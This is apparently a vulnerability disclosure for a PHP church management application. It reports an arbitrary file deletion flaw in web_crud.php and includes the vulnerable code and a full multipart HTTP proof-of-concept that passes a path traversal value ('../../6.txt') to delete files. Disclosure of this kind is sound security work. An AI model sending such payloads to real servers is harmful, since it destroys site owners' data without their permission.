### Vulnerability file address

In line 185 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photo3_img']);`,` $_POST['old_photo3_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['photo3']['tmp_name'] != '') {
            $img2 = generateUniqueFilename($_FILES['photo3']);
            $filepath = "../../assets/images/" . $img2;

            if (move_uploaded_file($_FILES["photo3"]["tmp_name"], $filepath)) {
                @unlink("../../assets/images/" . $_POST['old_photo3_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 373

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update2"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo3_img"

../../6.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo3";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `6.txt` file in the `church/` directory

![image-20250504211215615](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042112654.png)

Then we execute the above poc to attack

![image-20250504211227137](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042112162.png)

Files are deleted after the attack is successful

![image-20250504211240596](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042112627.png)